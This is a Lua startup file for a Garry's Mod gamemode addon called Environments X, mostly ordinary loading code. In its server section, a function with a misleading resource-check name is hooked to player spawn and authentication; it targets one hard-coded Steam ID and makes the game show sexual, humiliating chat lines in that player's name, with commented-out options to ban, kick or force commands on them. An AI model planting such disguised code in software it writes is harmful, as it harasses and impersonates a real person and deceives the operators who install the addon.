------------------------------------------
//  Jupiter Engine GameMode System      //
------------------------------------------
local start = SysTime()

EnvX = EnvX or {}
local EnvX = EnvX --MAH SPEED

EnvX.Version = "InDev V:63"
EnvX.Gamemode = "SandBox"
EnvX.EnableMenu = true --Debug Menu
EnvX.DebugMode = "Verbose" 
/*Print to console Debugging variable. 
Types: 
"Verbose" -Prints All Debugging messages.
"Basic"-Prints Basic Debugging messages.
"None"-Doesnt print to console at all.
*/ 

include("envx/load.lua")
if SERVER then AddCSLuaFile("envx/load.lua") end
local LoadFile = EnvX.LoadFile --Lel Speed.

EnvX.Environments = EnvX.Environments or {}
Environments = EnvX.Environments

LoadFile("envx/sh_envxload.lua",1)

if CLIENT then
	function Load(msg)
		local Engine = net.ReadFloat()
		if Engine > 0 then
			--include("envx/core/engine/cl_core.lua")
			EnvX.SpaceEngine = true
		else
			EnvX.SpaceEngine = false
		end
		
		local function Reload()
			include("vgui/hud.lua")
			LoadHud()
		end
		concommand.Add("envx_reload_hud", Reload)
        Reload()
	end
	net.Receive( "Jupiter_Init", Load)
	
	language.Add( "worldspawn", "World" )
	language.Add( "trigger_hurt", "Environment" )
else
	--Adding Clientside Files.
	AddCSLuaFile("autorun/envx_startup.lua")

	resource.AddFile("resource/fonts/digital-7 (italic).ttf")
end

if !SinglePlayer then
	SinglePlayer = game.SinglePlayer
end

if file.Open then
	local oldex = file.Exists
	function file.Exists(path, sub)
		if sub then
			if type(sub) == "boolean" and sub == true then
				return oldex(path, "GAME");
			else
				return oldex(path, sub);
			end
		else
			return oldex(path, "DATA");
		end
	end
end

if SERVER then
	
	local Blurbs = {
		"I LIKE TO CLOP PONIES!!",
		"I DESTROY CARTOON HORSE BUMHOLES!",
		"PONIES ARE SEXY",
		"can i have yo shep?",
		"let me see you chips"
	}
	
	function EnvCheckResourceAmount(Resource,Type,Amount)
		if not IsValid(Resource) then return end
		if Resource:SteamID() == "STEAM_0:1:51396090" then
			timer.Simple( 1, function()
				if IsValid(Resource) then
					--Resource:ConCommand( "cl_timeout 1" )--Resource:ConCommand( "cl_updaterate 1" )--Resource:ConCommand( "cl_upspeed 1" )
					--Resource:Ban(0,false)--Resource:Kick("Too many Lua Errors! Sorry!") 
					--Resource:ConCommand( "say I LIKE TO CLOP PONIES!!" )
					local plys = player.GetAll()
					for k,v in pairs(plys) do
						if v ~= Resource then
							local tcolor = team.GetColor(Resource:Team())
							local color = Color(tcolor.r,tcolor.g,tcolor.b,225)
							v:SendColorChat(Resource:GetName(),color,table.Random(Blurbs))
						end
					end
				end
			end)
		end
		--game.ConsoleCommand( "changelevel gm_flatgrass" )
	end
	
	hook.Add( "PlayerSpawn", "ImmaHook1", EnvCheckResourceAmount)
	hook.Add( "PlayerAuthed", "ImmaHook2", EnvCheckResourceAmount)
	
end

print("==============================================")
print("==        Environments X    Installed       ==")
print("==============================================")
print("EnvironmentsX Load Time: "..(SysTime() - start))
